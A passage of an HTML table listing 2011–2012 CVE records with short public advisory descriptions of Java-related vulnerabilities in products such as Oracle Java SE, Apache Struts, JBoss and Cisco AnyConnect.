	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-2561">CVE-2012-2561</a></td>
		<td valign="top">HP Business Service Management (BSM) 9.12 does not properly restrict the uploading of .war files, which allows remote attackers to execute arbitrary JSP code within the JBOSS Application Server component via a crafted request to TCP port 1098, 1099, or 4444.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-2496">CVE-2012-2496</a></td>
		<td valign="top">A certain Java applet in the VPN downloader implementation in the WebLaunch feature in Cisco AnyConnect Secure Mobility Client 3.x before 3.0 MR7 on 64-bit Linux platforms does not properly restrict use of Java components, which allows remote attackers to execute arbitrary code via a crafted web site, aka Bug ID CSCty45925.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-2495">CVE-2012-2495</a></td>
		<td valign="top">The HostScan downloader implementation in Cisco AnyConnect Secure Mobility Client 3.x before 3.0 MR8 and Cisco Secure Desktop before 3.6.6020 does not compare the timestamp of offered software to the timestamp of installed software, which allows remote attackers to force a version downgrade by using (1) ActiveX or (2) Java components to offer signed code that corresponds to an older software release, aka Bug ID CSCtx74235.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-2494">CVE-2012-2494</a></td>
		<td valign="top">The VPN downloader implementation in the WebLaunch feature in Cisco AnyConnect Secure Mobility Client 2.x before 2.5 MR6 and 3.x before 3.0 MR8 does not compare the timestamp of offered software to the timestamp of installed software, which allows remote attackers to force a version downgrade by using (1) ActiveX or (2) Java components to offer signed code that corresponds to an older software release, aka Bug ID CSCtw48681.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-2493">CVE-2012-2493</a></td>
		<td valign="top">The VPN downloader implementation in the WebLaunch feature in Cisco AnyConnect Secure Mobility Client 2.x before 2.5 MR6 on Windows, and 2.x before 2.5 MR6 and 3.x before 3.0 MR8 on Mac OS X and Linux, does not properly validate binaries that are received by the downloader process, which allows remote attackers to execute arbitrary code via vectors involving (1) ActiveX or (2) Java components, aka Bug ID CSCtw47523.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-2197">CVE-2012-2197</a></td>
		<td valign="top">Stack-based buffer overflow in the Java Stored Procedure infrastructure in IBM DB2 9.1 before FP12, 9.5 through FP9, 9.7 through FP6, 9.8 through FP5, and 10.1 allows remote authenticated users to execute arbitrary code by leveraging certain CONNECT and EXECUTE privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-2148">CVE-2012-2148</a></td>
		<td valign="top">An issue exists in the property replacements feature in any descriptor in JBoxx AS 7.1.1 ignores java security policies

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1826">CVE-2012-1826</a></td>
		<td valign="top">dotCMS 1.9 before 1.9.5.1 allows remote authenticated users to execute arbitrary Java code via a crafted (1) XSLT or (2) Velocity template.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1738">CVE-2012-1738</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle iPlanet Web Server component in Oracle Sun Products Suite Java System Web Server 6.1 and Oracle iPlanet Web Server 7.0 allows remote attackers to affect availability via unknown vectors related to Web Server.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1726">CVE-2012-1726</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier allows remote attackers to affect confidentiality and integrity via unknown vectors related to Libraries.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1725">CVE-2012-1725</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, 6 update 32 and earlier, and 5 update 35 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1724">CVE-2012-1724</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, and 6 update 32 and earlier, allows remote attackers to affect availability, related to JAXP.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1723">CVE-2012-1723</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, 6 update 32 and earlier, 5 update 35 and earlier, and 1.4.2_37 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Hotspot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1722">CVE-2012-1722</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, and 6 update 32 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2012-1721.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1721">CVE-2012-1721</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, and 6 update 32 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2012-1722.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1720">CVE-2012-1720</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, 6 update 32 and earlier, 5 update 35 and earlier, and 1.4.2_37 and earlier, when running on Solaris, allows local users to affect confidentiality, integrity, and availability via unknown vectors related to Networking.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1719">CVE-2012-1719</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, 6 update 32 and earlier, 5 update 35 and earlier, and 1.4.2_37 and earlier allows remote attackers to affect integrity, related to CORBA.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1718">CVE-2012-1718</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, 6 update 32 and earlier, 5 update 35 and earlier, and 1.4.2_37 and earlier allows remote attackers to affect availability via unknown vectors related to Security.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1717">CVE-2012-1717</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, 6 update 32 and earlier, 5 update 35 and earlier, and 1.4.2_37 and earlier allows local users to affect confidentiality via unknown vectors related to printing on Solaris or Linux.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1716">CVE-2012-1716</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, 6 update 32 and earlier, and 5 update 35 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Swing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1713">CVE-2012-1713</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, 6 update 32 and earlier, 5 update 35 and earlier, 1.4.2_37 and earlier, and JavaFX 2.1 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1711">CVE-2012-1711</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 update 4 and earlier, 6 update 32 and earlier, 5 update 35 and earlier, and 1.4.2_37 and earlier allows remote attackers to affect confidentiality, integrity, and availability, related to CORBA.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1682">CVE-2012-1682</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 6 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Beans, a different vulnerability than CVE-2012-3136.  NOTE: Oracle has not commented on claims from a downstream vendor that this issue is related to "XMLDecoder security issue via ClassFinder."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1543">CVE-2012-1543</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX 2.2.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors, a different vulnerability than other CVEs listed in the February 2013 CPU.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from a third party that the issue is due to an invalid type cast in the JSObject class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1541">CVE-2012-1541</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 through Update 11 and 6 through Update 38 allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than other CVEs listed in the February 2013 CPU.  NOTE: the previous information is from the February 2013 CPU. Oracle has not commented on claims from a third party that the issue is due to an interaction error in between the JRE plug-in for WebKit-based browsers and the Javascript engine, which allows remote attackers to execute arbitrary code by modifying DOM nodes that contain applet elements in a way that triggers an incorrect reference count and a use after free.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1533">CVE-2012-1533</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, and 6 Update 35 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment, a different vulnerability than CVE-2012-3159.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1532">CVE-2012-1532</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier and 6 Update 35 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-1531">CVE-2012-1531</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 7 and earlier, 6 Update 35 and earlier, 5.0 Update 36 and earlier, and 1.4.2_38 and earlier; and JavaFX 2.2 and earlier; allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0881">CVE-2012-0881</a></td>
		<td valign="top">Apache Xerces2 Java Parser before 2.12.0 allows remote attackers to cause a denial of service (CPU consumption) via a crafted message to an XML service, which triggers hash table collisions.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0838">CVE-2012-0838</a></td>
		<td valign="top">Apache Struts 2 before 2.2.3.1 evaluates a string as an OGNL expression during the handling of a conversion error, which allows remote attackers to modify run-time data values, and consequently execute arbitrary code, via invalid input to a field.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0551">CVE-2012-0551</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) in Oracle Java SE 7 update 4 and earlier and 6 update 32 and earlier, and the GlassFish Enterprise Server component in Oracle Sun Products Suite GlassFish Enterprise Server 3.1.1, allows remote attackers to affect confidentiality and integrity via unknown vectors related to Web Container or Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0547">CVE-2012-0547</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 6 and earlier, and 6 Update 34 and earlier, has no impact and remote attack vectors involving AWT and "a security-in-depth issue that is not directly exploitable but which can be used to aggravate security vulnerabilities that can be directly exploited." NOTE: this identifier was assigned by the Oracle CNA, but CVE is not intended to cover defense-in-depth issues that are only exposed by the presence of other vulnerabilities.  NOTE: Oracle has not commented on claims from a downstream vendor that this issue is related to "toolkit internals references."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0522">CVE-2012-0522</a></td>
		<td valign="top">Unspecified vulnerability in the Oracle JDeveloper component in Oracle Fusion Middleware 10.1.3.5 allows remote attackers to affect integrity via unknown vectors related to Java Business Objects.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0508">CVE-2012-0508</a></td>
		<td valign="top">Unspecified vulnerability in the JavaFX component in Oracle Java SE JavaFX, 1.3.0 and earlier, and 1.2.2 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0507">CVE-2012-0507</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, and 5.0 Update 33 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Concurrency.  NOTE: the previous information was obtained from the February 2012 Oracle CPU. Oracle has not commented on claims from a downstream vendor and third party researchers that this issue occurs because the AtomicReferenceArray class implementation does not ensure that the array is of the Object[] type, which allows attackers to cause a denial of service (JVM crash) or bypass Java sandbox restrictions.  NOTE: this issue was originally mapped to CVE-2011-3571, but that identifier was already assigned to a different issue.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0506">CVE-2012-0506</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, 5.0 Update 33 and earlier, and 1.4.2_35 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect integrity via unknown vectors related to CORBA.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0505">CVE-2012-0505</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, 5 Update 33 and earlier, and 1.4.2_35 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Serialization.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0504">CVE-2012-0504</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, and 6 Update 30 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to Install and the Java Update mechanism.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0503">CVE-2012-0503</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, 5.0 Update 33 and earlier, and 1.4.2_35 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability, related to I18n.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0502">CVE-2012-0502</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, 5.0 Update 33 and earlier, and 1.4.2_35 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality and availability, related to AWT.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0501">CVE-2012-0501</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, and 5.0 Update 33 and earlier allows remote attackers to affect availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0500">CVE-2012-0500</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, and JavaFX 2.0.2 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0499">CVE-2012-0499</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, 5.0 Update 33 and earlier, and 1.4.2_35 and earlier; and JavaFX 2.0.2 and earlier; allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0498">CVE-2012-0498</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, and 5.0 Update 33 and earlier allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0497">CVE-2012-0497</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, and 6 Update 30 and earlier, allows remote attackers to affect confidentiality, integrity, and availability via unknown vectors related to 2D.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0393">CVE-2012-0393</a></td>
		<td valign="top">The ParameterInterceptor component in Apache Struts before 2.3.1.1 does not prevent access to public constructors, which allows remote attackers to create or overwrite arbitrary files via a crafted parameter that triggers the creation of a Java object.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0392">CVE-2012-0392</a></td>
		<td valign="top">The CookieInterceptor component in Apache Struts before 2.3.1.1 does not use the parameter-name whitelist, which allows remote attackers to execute arbitrary commands via a crafted HTTP Cookie header that triggers Java code execution through a static method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0391">CVE-2012-0391</a></td>
		<td valign="top">The ExceptionDelegator component in Apache Struts before 2.2.3.1 interprets parameter values as OGNL expressions during certain exception handling for mismatched data types of properties, which allows remote attackers to execute arbitrary Java code via a crafted parameter.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0296">CVE-2012-0296</a></td>
		<td valign="top">Multiple cross-site scripting (XSS) vulnerabilities in the management GUI in Symantec Web Gateway 5.0.x before 5.0.3 allow remote attackers to inject arbitrary web script or HTML via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2012-0213">CVE-2012-0213</a></td>
		<td valign="top">The UnhandledDataStructure function in hwpf/model/UnhandledDataStructure.java in Apache POI 3.8 and earlier allows remote attackers to cause a denial of service (OutOfMemoryError exception and possibly JVM destabilization) via a crafted length value in a Channel Definition Format (CDF) or Compound File Binary Format (CFBF) document.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-5245">CVE-2011-5245</a></td>
		<td valign="top">The readFrom function in providers.jaxb.JAXBXmlTypeProvider in RESTEasy before 2.3.2 allows remote attackers to read arbitrary files via an external entity reference in a Java Architecture for XML Binding (JAXB) input, aka an XML external entity (XXE) injection attack, a similar vulnerability to CVE-2012-0818.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-5035">CVE-2011-5035</a></td>
		<td valign="top">Oracle Glassfish 2.1.1, 3.0.1, and 3.1.1, as used in Communications Server 2.0, Sun Java System Application Server 8.1 and 8.2, and possibly other products, computes hash values for form parameters without restricting the ability to trigger hash collisions predictably, which allows remote attackers to cause a denial of service (CPU consumption) by sending many crafted parameters, aka Oracle security ticket S0104869.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-4695">CVE-2011-4695</a></td>
		<td valign="top">Unspecified vulnerability in Microsoft Windows 7 SP1, when Java is installed, allows local users to bypass Internet Explorer sandbox restrictions and gain privileges via unknown vectors, as demonstrated by the White Phosphorus wp_ie_sandbox_escape module for Immunity CANVAS.  NOTE: as of 20111207, this disclosure has no actionable information. However, because the module author is a reliable researcher, the issue is being assigned a CVE identifier for tracking purposes.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-4650">CVE-2011-4650</a></td>
		<td valign="top">Cisco Data Center Network Manager is affected by Excessive Logging During a TCP Flood on Java Ports. If the size of server.log becomes very big because of too much logging by the DCNM server, then the CPU utilization increases. Known Affected Releases: 5.2(1). Known Fixed Releases: 6.0(0)SL1(0.14) 5.2(2.73)S0. Product identification: CSCtt15295.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-4605">CVE-2011-4605</a></td>
		<td valign="top">The (1) JNDI service, (2) HA-JNDI service, and (3) HAJNDIFactory invoker servlet in JBoss Enterprise Application Platform 4.3.0 CP10 and 5.1.2, Web Platform 5.1.2, SOA Platform 4.2.0.CP05 and 4.3.0.CP05, Portal Platform 4.3 CP07 and 5.2.x before 5.2.2, and BRMS Platform before 5.3.0 do not properly restrict write access, which allows remote attackers to add, delete, or modify items in a JNDI tree via unspecified vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-4457">CVE-2011-4457</a></td>
		<td valign="top">OWASP HTML Sanitizer (aka owasp-java-html-sanitizer) before 88, when JavaScript is disabled, allows user-assisted remote attackers to obtain potentially sensitive information via a crafted FORM element within a NOSCRIPT element.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-4314">CVE-2011-4314</a></td>
		<td valign="top">message/ax/AxMessage.java in OpenID4Java before 0.9.6 final, as used in JBoss Enterprise Application Platform 5.1 before 5.1.2, Step2, Kay Framework before 1.0.2, and possibly other products does not verify that Attribute Exchange (AX) information is signed, which allows remote attackers to modify potentially sensitive AX information without detection via a man-in-the-middle (MITM) attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3898">CVE-2011-3898</a></td>
		<td valign="top">Google Chrome before 15.0.874.120, when Java Runtime Environment (JRE) 7 is used, does not request user confirmation before applet execution begins, which allows remote attackers to have an unspecified impact via a crafted applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3571">CVE-2011-3571</a></td>
		<td valign="top">Unspecified vulnerability in the Virtual Desktop Infrastructure (VDI) component in Oracle Virtualization 3.2 allows remote authenticated users to affect confidentiality and integrity via unknown vectors related to Session.  NOTE: this CVE identifier was accidentally used for a Concurrency issue in Java Runtime Environment, but that issue has been reassigned to CVE-2012-0507.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3563">CVE-2011-3563</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment (JRE) component in Oracle Java SE 7 Update 2 and earlier, 6 Update 30 and earlier, 5.0 Update 33 and earlier, and 1.4.2_35 and earlier allows remote attackers to affect confidentiality and availability via unknown vectors related to Sound.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3561">CVE-2011-3561</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, and JavaFX 2.0 allows remote attackers to affect confidentiality via unknown vectors related to Deployment.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3560">CVE-2011-3560</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, 5.0 Update 31 and earlier, and 1.4.2_33 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality and integrity, related to JSSE.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3559">CVE-2011-3559</a></td>
		<td valign="top">Unspecified vulnerability in Oracle Communications Server 2.0; GlassFish Enterprise Server 2.1.1, 3.0.1, and 3.1.1; and Sun Java System App Server 8.1 and 8.2 allows remote attackers to affect availability via unknown vectors related to Web Container.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3558">CVE-2011-3558</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality via unknown vectors related to HotSpot.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3557">CVE-2011-3557</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, 5.0 Update 31 and earlier, 1.4.2_33 and earlier, and JRockit R28.1.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability, related to RMI, a different vulnerability than CVE-2011-3556.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3556">CVE-2011-3556</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, 5.0 Update 31 and earlier, 1.4.2_33 and earlier, and JRockit R28.1.4 and earlier allows remote attackers to affect confidentiality, integrity, and availability, related to RMI, a different vulnerability than CVE-2011-3557.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3555">CVE-2011-3555</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE, and 7 allows remote untrusted Java Web Start applications and untrusted Java applets to affect integrity and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3554">CVE-2011-3554</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, 5.0 Update 31 and earlier allows remote untrusted Java Web Start applications and untrusted Java applets to affect confidentiality, integrity, and availability via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3553">CVE-2011-3553</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, and JRockit R28.1.4 and earlier allows remote authenticated users to affect confidentiality, related to JAXWS.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3552">CVE-2011-3552</a></td>
		<td valign="top">Unspecified vulnerability in the Java Runtime Environment component in Oracle Java SE JDK and JRE 7, 6 Update 27 and earlier, 5.0 Update 31 and earlier, and 1.4.2_33 and earlier allows remote attackers to affect integrity via unknown vectors related to Networking.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2011-3551">CVE-2011-3551</a></td>
